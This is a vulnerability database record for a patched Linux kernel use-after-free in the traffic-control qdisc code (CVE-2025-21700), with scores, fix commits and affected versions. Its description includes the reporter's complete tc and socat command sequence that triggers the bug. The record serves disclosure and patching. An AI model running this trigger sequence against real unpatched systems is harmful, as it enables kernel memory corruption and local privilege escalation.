{"id": "EUVD-2025-2649", "enisaUuid": "e7744947-7727-3526-8071-274a0d160b88", "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nnet: sched: Disallow replacing of child qdisc from one parent to another\n\nLion Ackermann was able to create a UAF which can be abused for privilege\nescalation with the following script\n\nStep 1. create root qdisc\ntc qdisc add dev lo root handle 1:0 drr\n\nstep2. a class for packet aggregation do demonstrate uaf\ntc class add dev lo classid 1:1 drr\n\nstep3. a class for nesting\ntc class add dev lo classid 1:2 drr\n\nstep4. a class to graft qdisc to\ntc class add dev lo classid 1:3 drr\n\nstep5.\ntc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024\n\nstep6.\ntc qdisc add dev lo parent 1:2 handle 3:0 drr\n\nstep7.\ntc class add dev lo classid 3:1 drr\n\nstep 8.\ntc qdisc add dev lo parent 3:1 handle 4:0 pfifo\n\nstep 9. Display the class/qdisc layout\n\ntc class ls dev lo\n class drr 1:1 root leaf 2: quantum 64Kb\n class drr 1:2 root leaf 3: quantum 64Kb\n class drr 3:1 root leaf 4: quantum 64Kb\n\ntc qdisc ls\n qdisc drr 1: dev lo root refcnt 2\n qdisc plug 2: dev lo parent 1:1\n qdisc pfifo 4: dev lo parent 3:1 limit 1000p\n qdisc drr 3: dev lo parent 1:2\n\nstep10. trigger the bug <=== prevented by this patch\ntc qdisc replace dev lo parent 1:3 handle 4:0\n\nstep 11. Redisplay again the qdiscs/classes\n\ntc class ls dev lo\n class drr 1:1 root leaf 2: quantum 64Kb\n class drr 1:2 root leaf 3: quantum 64Kb\n class drr 1:3 root leaf 4: quantum 64Kb\n class drr 3:1 root leaf 4: quantum 64Kb\n\ntc qdisc ls\n qdisc drr 1: dev lo root refcnt 2\n qdisc plug 2: dev lo parent 1:1\n qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p\n qdisc drr 3: dev lo parent 1:2\n\nObserve that a) parent for 4:0 does not change despite the replace request.\nThere can only be one parent.  b) refcount has gone up by two for 4:0 and\nc) both class 1:3 and 3:1 are pointing to it.\n\nStep 12.  send one packet to plug\necho \"\" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))\nstep13.  send one packet to the grafted fifo\necho \"\" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))\n\nstep14. lets trigger the uaf\ntc class delete dev lo classid 1:3\ntc class delete dev lo classid 1:1\n\nThe semantics of \"replace\" is for a del/add _on the same node_ and not\na delete from one node(3:1) and add to another node (1:3) as in step10.\nWhile we could \"fix\" with a more complex approach there could be\nconsequences to expectations so the patch takes the preventive approach of\n\"disallow such config\".\n\nJoint work with Lion Ackermann <nnamrec@gmail.com>", "datePublished": "2025-02-13T11:30:19", "dateUpdated": "2025-11-03T19:35:46", "baseScore": 7.8, "baseScoreVersion": "3.1", "baseScoreVector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "references": ["https://git.kernel.org/stable/c/7e2bd8c13b07e29a247c023c7444df23f9a79fd8", "https://git.kernel.org/stable/c/73c7e1d6898ccbeee126194dcc05f58b8a795e70", "https://git.kernel.org/stable/c/46c59ec33ec98aba20c15117630cae43a01404cc", "https://git.kernel.org/stable/c/bc50835e83f60f56e9bec2b392fb5544f250fb6f", "https://nvd.nist.gov/vuln/detail/CVE-2025-21700", "https://git.kernel.org/stable/c/deda09c0543a66fa51554abc5ffd723d99b191bf", "https://git.kernel.org/stable/c/38646749d6e12f9d80a08d21ca39f0beca20230d", "https://git.kernel.org/stable/c/cd796e269123e1994bfc4e99dd76680ba0946a97", "https://git.kernel.org/stable/c/fe18c21d67dc7d1bcce1bba56515b1b0306db19b", "https://lists.debian.org/debian-lts-announce/2025/03/msg00028.html", "https://lists.debian.org/debian-lts-announce/2025/05/msg00030.html"], "aliases": ["CVE-2025-21700"], "assigner": "Linux", "epss": 0.03, "enisaIdProduct": [{"id": "06c6b943-fd0a-3365-a5cb-2e4fdb10944a", "product": {"name": "Linux"}, "product_version": "patch: 5.10.235"}, {"id": "22560b50-cb60-3c3f-b0c5-68931fc98c63", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <deda09c0543a66fa51554abc5ffd723d99b191bf"}, {"id": "27e4beea-d2a2-30e2-ba3b-962322838aef", "product": {"name": "Linux"}, "product_version": "patch: 5.15.179"}, {"id": "3891844a-b0ea-34bf-b24f-0d4ca5b11053", "product": {"name": "Linux"}, "product_version": "patch: 6.6.76"}, {"id": "3bb08577-d610-3dcc-83ab-c5c18d6c2f87", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <cd796e269123e1994bfc4e99dd76680ba0946a97"}, {"id": "4065f0d4-8831-3f56-ac06-effb23067416", "product": {"name": "Linux"}, "product_version": "2.6.12"}, {"id": "480b81da-cabc-3bee-9e97-d58a7303f07e", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <7e2bd8c13b07e29a247c023c7444df23f9a79fd8"}, {"id": "58452c38-45b5-3163-9274-9842749ffab4", "product": {"name": "Linux"}, "product_version": "patch: 5.4.291"}, {"id": "59a4fa4f-957a-3fc4-8b0f-4d6c690adc51", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <38646749d6e12f9d80a08d21ca39f0beca20230d"}, {"id": "751e7350-eecd-38f1-ae44-e4d73d5219c9", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <bc50835e83f60f56e9bec2b392fb5544f250fb6f"}, {"id": "85b555c3-90f2-3b9a-a7d9-5da13c3dc512", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <46c59ec33ec98aba20c15117630cae43a01404cc"}, {"id": "95348728-6300-37e4-85fd-aa103eb20e49", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <fe18c21d67dc7d1bcce1bba56515b1b0306db19b"}, {"id": "aec26567-4d31-3d0c-95f8-a17572d3bc1c", "product": {"name": "Linux"}, "product_version": "patch: 6.1.129"}, {"id": "ca485f68-de96-3a9b-a14e-79363c092d76", "product": {"name": "Linux"}, "product_version": "patch: 6.13.2"}, {"id": "cb96a21d-3ef4-3bba-8eda-b043e6d3c290", "product": {"name": "Linux"}, "product_version": "patch: 0"}, {"id": "e2ffa6ff-d05b-381e-973b-76841f4c696b", "product": {"name": "Linux"}, "product_version": "patch: 6.14"}, {"id": "ed5ab864-40b3-3319-8452-368d6a4b0cc0", "product": {"name": "Linux"}, "product_version": "patch: 6.12.13"}, {"id": "f2b43cc4-5802-3151-b535-d8724b664ced", "product": {"name": "Linux"}, "product_version": "1da177e4c3f41524e886b7f1b8a0c1fc7321cac2 <73c7e1d6898ccbeee126194dcc05f58b8a795e70"}], "enisaIdVendor": [{"id": "8e20f56d-efe5-364e-9489-c31b5db7d301", "vendor": {"name": "Linux"}}], "isExploited": false}